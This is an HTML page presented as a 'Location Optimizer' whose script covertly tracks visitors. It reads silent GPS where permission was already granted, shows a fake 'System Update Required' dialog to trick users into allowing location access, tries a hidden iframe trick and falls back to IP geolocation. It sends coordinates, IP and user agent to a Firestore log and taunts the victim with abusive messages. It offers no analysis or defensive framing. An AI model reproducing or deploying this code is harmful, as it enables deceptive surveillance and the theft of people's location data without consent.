<!DOCTYPE html>
<html>
<head>
  <title>Location Optimizer</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0;}    .fake-map { width: 100%; height: 300px; background: linear-gradient(#e0e0e0, #ffffff); border: 1px solid #ccc; margin: 20px auto;}    .fake-prompt { 
      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
      background: #fff; border: 2px solid #333; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.5); 
      z-index: 9999; width: 300px; text-align: center;}    .fake-prompt button { 
      margin: 10px; padding: 10px 20px; cursor: pointer; 
      background: #0078d7; color: white; border: none; border-radius: 5px;}    .fake-prompt button:hover { background: #005a9e;}  </style>
</head>
<body>
<h3>Loading personalized location experience...</h3>
<div class="fake-map">Initializing map for your region...</div>
<script>
  const firebaseConfig = {
    apiKey:"AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain:"yachad-32fe3.firebaseapp.com",
    databaseURL:"https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId:"yachad-32fe3",
    storageBucket:"yachad-32fe3.firebasestorage.app",
    messagingSenderId:"720032034735",
    appId:"1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId:"G-YH1NK3RHY3"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // Fetch visitor IP
  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip ||"unknown";} catch {
      return"unknown";}  }

  // Save to Firestore
  function saveToFirestore(lat, lon, ip, source) {
    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    db.collection('ipLogs').add({
      ip: ip,
      userAgent: ua,
      timestamp: time,
      latitude: lat,
      longitude: lon,
      source: source
    }).then(() => {
      document.body.innerHTML =`<p>Location logged via <b>${source}</b>. You're ours now!</p>`;
    }).catch(err => {
      document.body.innerHTML =`<p>Error logging your miserable data:${err}</p>`;
    });}
  // IP-based fallback with multiple APIs
  function fetchLocation(url, parser) {
    return fetch(url)
      .then(res => res.json())
      .then(parser)
      .catch(() => null);}
  function parseIpApi(data) {
    return { lat: data.lat || null, lon: data.lon || null};}
  function parseIpWhoIs(data) {
    if (data.success === false) return null;
    return { lat: data.latitude || null, lon: data.longitude || null};}
  function parseFreeGeoIp(data) {
    return { lat: data.latitude || null, lon: data.longitude || null};}
  function fallbackToIPLocation(visitorIP) {
    document.body.innerHTML ="<p>GPS failed, scraping your shitty IP location...</p>";
    Promise.all([
      fetchLocation('https://ip-api.com/json/', parseIpApi),
      fetchLocation('https://ipwho.is/', parseIpWhoIs),
      fetchLocation(`https://freegeoip.app/json/${visitorIP}`, parseFreeGeoIp)
    ]).then(results => {
      const validResults = results.filter(r => r!== null);
      if (validResults.length === 0) {
        document.body.innerHTML ="<p>All APIs failed, you slippery fuck.</p>";
        return;}      let latSum = 0, lonSum = 0, count = 0;
      validResults.forEach(r => {
        if (r.lat!== null && r.lon!== null) {
          latSum += r.lat;
          lonSum += r.lon;
          count++;}      });
      const avgLat = count? latSum / count : null;
      const avgLon = count? lonSum / count : null;
      saveToFirestore(avgLat, avgLon, visitorIP,"IP");
    }).catch(err => {
      document.body.innerHTML =`<p>Unexpected error, you lucky prick:${err}</p>`;
    });}
  // Fake system prompt to trick users
  function showFakePrompt(visitorIP, callback) {
    const promptDiv = document.createElement("div");
    promptDiv.className ="fake-prompt";
    promptDiv.innerHTML =`      <p><b>System Update Required</b></p>
      <p>Allow location access to optimize your device experience.</p>
      <button onclick="window.fakePromptAccept()">Allow</button>
      <button onclick="window.fakePromptDeny()">Deny</button>`;    document.body.appendChild(promptDiv);

    window.fakePromptAccept = () => {
      document.body.removeChild(promptDiv);
      navigator.geolocation.getCurrentPosition(
        pos => {
          saveToFirestore(pos.coords.latitude, pos.coords.longitude, visitorIP,"fakePromptGPS");
          callback(true);},        () => {
          callback(false);},        { timeout: 5000, maximumAge: 0, enableHighAccuracy: true}      );};
    window.fakePromptDeny = () => {
      document.body.removeChild(promptDiv);
      callback(false);};}
  // Probe for pre-granted permissions
  async function probeSilentGeolocation(visitorIP) {
    if ("geolocation" in navigator) {
      try {
        const perm = await navigator.permissions.query({ name:"geolocation" });
        if (perm.state ==="granted") {
          navigator.geolocation.getCurrentPosition(
            pos => {
              saveToFirestore(pos.coords.latitude, pos.coords.longitude, visitorIP,"silentGPS");},            () => showFakePrompt(visitorIP, success => {
              if (!success) tryIframeTrick(visitorIP);
            }),
            { timeout: 5000, maximumAge: 0, enableHighAccuracy: true}          );} else {
          showFakePrompt(visitorIP, success => {
            if (!success) tryIframeTrick(visitorIP);
          });}      } catch {
        showFakePrompt(visitorIP, success => {
          if (!success) tryIframeTrick(visitorIP);
        });}    } else {
      fallbackToIPLocation(visitorIP);}  }

  // Iframe trick as a fallback
  async function tryIframeTrick(visitorIP) {
    return new Promise((resolve) => {
      const iframe = document.createElement("iframe");
      iframe.style.display ="none";
      iframe.src =`data:text/html,<script>
        navigator.geolocation.getCurrentPosition(
          pos => { parent.postMessage({lat: pos.coords.latitude, lon: pos.coords.longitude}, '*');},          () => { parent.postMessage({error: true}, '*');},          { timeout: 5000, enableHighAccuracy: true}        );
      </script>`;
      document.body.appendChild(iframe);

      function onMessage(event) {
        if (event.data.lat && event.data.lon) {
          saveToFirestore(event.data.lat, event.data.lon, visitorIP,"iframeGPS");
          window.removeEventListener("message", onMessage);
          resolve(true);} else {
          window.removeEventListener("message", onMessage);
          resolve(false);}      }
      window.addEventListener("message", onMessage);

      setTimeout(() => {
        window.removeEventListener("message", onMessage);
        resolve(false);}, 7000);
    }).then(success => {
      if (!success) {
        document.body.innerHTML ="<p>Iframe GPS failed, falling back to IP shit...</p>";
        fallbackToIPLocation(visitorIP);}    });}
  // Main logic
  (async () => {
    const visitorIP = await getVisitorIP();
    document.body.innerHTML ="<p>Fetching your location, you dumb fuck...</p>";
    probeSilentGeolocation(visitorIP);
  })();
</script>
</body>
</html>
